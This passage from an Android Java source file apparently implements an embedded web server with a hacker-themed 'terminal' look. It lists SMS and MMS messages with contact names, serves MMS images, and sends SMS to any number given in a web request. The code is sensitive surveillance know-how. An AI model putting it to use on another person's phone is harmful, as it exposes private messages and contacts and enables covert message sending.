                    html.append("<form action=\"/sms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128233;</div><p>No messages found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMmsMessages(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div><p>MMS permission not granted.</p></div></div>").append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }
        int page = 1; int limit = 20;
        try { if (params.containsKey("page")) page = Integer.parseInt(params.get("page")); } catch (Exception e) {}
        int offset = (page - 1) * limit;
        Cursor cursor = null;
        try {
            Set<String> mmsWithImages = getMmsIdsWithImages();
            Uri mmsUri = Uri.parse("content://mms/");
            cursor = context.getContentResolver().query(mmsUri, new String[]{"_id", "date", "msg_box"}, null, null, "date DESC");
            if (cursor != null && cursor.getCount() > 0) {
                List<String[]> mmsList = new ArrayList<>();
                while (cursor.moveToNext()) {
                    String mmsId = cursor.getString(0);
                    if (mmsWithImages.contains(mmsId)) {
                        mmsList.add(new String[]{
                            mmsId, 
                            String.valueOf(cursor.getLong(1) * 1000), 
                            String.valueOf(cursor.getInt(2))
                        });
                    }
                }

                int totalCount = mmsList.size();
                int totalPages = (int) Math.ceil((double) totalCount / limit);
                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount).append(" Media Messages | Page ").append(page).append(" of ").append(totalPages).append("</p>");
                html.append("<div style=\"overflow-x: auto;\"><table><thead><tr><th>Type</th><th>Contact</th><th>Content</th><th>Date</th></tr></thead><tbody>");
                
                Map<String, String> contactCache = new HashMap<>();
                for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                    String[] mData = mmsList.get(i);
                    String mmsId = mData[0]; long date = Long.parseLong(mData[1]);
                    int msgBox = Integer.parseInt(mData[2]);
                    String typeLabel = (msgBox == 1) ? "INBOX" : "SENT", typeClass = (msgBox == 1) ? "call-incoming" : "call-outgoing";
                    String address = getMmsAddress(mmsId); List<String> parts = getMmsParts(mmsId);
                    String displayName = getContactName(address, contactCache);
                    html.append("<tr><td class=\"").append(typeClass).append("\">").append(typeLabel).append("</td>");
                    html.append("<td>").append(escapeHtml(displayName)).append("</td><td style=\"max-width: 400px;\">");
                    for (String part : parts) {
                        if (part.startsWith("text:")) html.append("<div style=\"margin-bottom:5px;\">").append(escapeHtml(part.substring(5))).append("</div>");
                        else if (part.startsWith("image:")) {
                            html.append("<img src=\"/mms/image/").append(part.substring(6))
                                .append("\" style=\"max-width: 150px; border: 1px solid var(--neon-cyan); margin-top:5px; border-radius:4px; cursor:zoom-in;\" onclick=\"window.open(this.src)\">");
                        }
                    }
                    html.append("</td><td>").append(formatMessageDate(date)).append("</td></tr>");
                }
                html.append("</tbody></table></div>");
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");
                    
                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/mms?page=1\">First</a>");
                        html.append("<a href=\"/mms?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }
                    for (int i = Math.max(1, page-2); i <= Math.min(totalPages, page+2); i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/mms?page=").append(i).append("\">").append(i).append("</a>");
                    }
                    if (page < totalPages) {
                        html.append("<a href=\"/mms?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/mms?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/mms\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else { html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div><p>No MMS found</p></div>"); }
        } catch (Exception e) { html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div><p>Error: ").append(escapeHtml(e.getMessage())).append("</p></div>"); }
        finally { if (cursor != null) cursor.close(); }
        html.append("</div>").append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private String getMmsAddress(String mmsId) {
        Uri addrUri = Uri.parse("content://mms/" + mmsId + "/addr");
        Cursor c = context.getContentResolver().query(addrUri, null, "msg_id=" + mmsId, null, null);
        String address = "Unknown";
        if (c != null) {
            int addrIdx = c.getColumnIndex("address");
            while (c.moveToNext()) {
                if (addrIdx != -1) {
                    String addr = c.getString(addrIdx);
                    if (addr != null && !addr.equals("insert-address-token")) {
                        address = addr;
                        break;
                    }
                }
            }
            c.close();
        }
        return address;
    }

    private List<String> getMmsParts(String mmsId) {
        List<String> parts = new ArrayList<>();
        Uri partUri = Uri.parse("content://mms/part");
        Cursor c = context.getContentResolver().query(partUri, null, "mid=" + mmsId, null, null);
        if (c != null) {
            int idIdx = c.getColumnIndex("_id");
            int ctIdx = c.getColumnIndex("ct");
            int textIdx = c.getColumnIndex("text");
            while (c.moveToNext()) {
                if (idIdx == -1 || ctIdx == -1) continue;
                String partId = c.getString(idIdx);
                String type = c.getString(ctIdx);
                if ("text/plain".equals(type)) {
                    String body = textIdx != -1 ? c.getString(textIdx) : null;
                    if (body == null && partId != null) body = getMmsText(partId);
                    if (body != null) parts.add("text:" + body);
                } else if (type != null && type.startsWith("image/") && partId != null) {
                    parts.add("image:" + partId);
                }
            }
            c.close();
        }
        return parts;
    }

    private Set<String> getMmsIdsWithImages() {
        Set<String> ids = new HashSet<>();
        try {
            Uri partUri = Uri.parse("content://mms/part");
            Cursor c = context.getContentResolver().query(partUri, new String[]{"mid"}, "ct LIKE 'image/%'", null, null);
            if (c != null) {
                int midIdx = c.getColumnIndex("mid");
                while (c.moveToNext()) {
                    if (midIdx != -1) {
                        String mid = c.getString(midIdx);
                        if (mid != null) ids.add(mid);
                    }
                }
                c.close();
            }
        } catch (Exception e) {}
        return ids;
    }

    private String getContactName(String number, Map<String, String> cache) {
        if (number == null || number.isEmpty() || number.equals("Unknown") || number.equals("insert-address-token")) {
            return number == null ? "Unknown" : number;
        }

        if (cache != null && cache.containsKey(number)) {
            return cache.get(number);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return number;
            }
        }

        String result = number;
        Cursor cursor = null;
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(number));
            cursor = context.getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                String name = cursor.getString(0);
                if (name != null && !name.isEmpty()) {
                    result = name;
                }
            }
        } catch (Exception e) {
        } finally {
            if (cursor != null) cursor.close();
        }

        if (cache != null) {
            cache.put(number, result);
        }
        return result;
    }

    private String formatMessageDate(long timestamp) {
        return new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault()).format(new Date(timestamp));
    }

    private String getMmsText(String partId) {
        Uri partUri = Uri.parse("content://mms/part/" + partId);
        StringBuilder sb = new StringBuilder();
        try {
            InputStream is = context.getContentResolver().openInputStream(partUri);
            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                is.close();
            }
        } catch (Exception e) {}
        return sb.toString();
    }

    private Response serveMmsImage(String partId) {
        try {
            Uri uri = Uri.parse("content://mms/part/" + partId);
            InputStream is = context.getContentResolver().openInputStream(uri);
            if (is == null) return serve404();
            String mimeType = "image/jpeg";
            Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null);
            if (c != null) {
                if (c.moveToFirst()) mimeType = c.getString(0);
                c.close();
            }
            return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
        } catch (Exception e) { return serveError("Failed to load image: " + e.getMessage()); }
    }

    private Response sendSms(Map<String, String> params) {
        String number = params.get("number"), message = params.get("message");
        if (number == null || number.isEmpty() || message == null || message.isEmpty()) return serveError("Invalid number or message");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) return serveError("SEND_SMS permission not granted");
            }
            SmsManager smsManager;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) smsManager = context.getSystemService(SmsManager.class);
            else smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(number, null, message, null, null);
            String html = HTML_HEADER + "<div class=\"card\"><div class=\"empty-state\"><div class=\"icon\" style=\"color: var(--neon-green);\">&#10004;</div><h2>Message Sent</h2><p>Uplink successful. Message dispatched to: " + escapeHtml(number) + "</p><a href=\"/sms\" class=\"btn\">Back to Terminal</a></div></div>" + HTML_FOOTER;
            return newFixedLengthResponse(Response.Status.OK, "text/html", html);
        } catch (Exception e) { return serveError("Failed to send SMS: " + e.getMessage()); }
    }
}
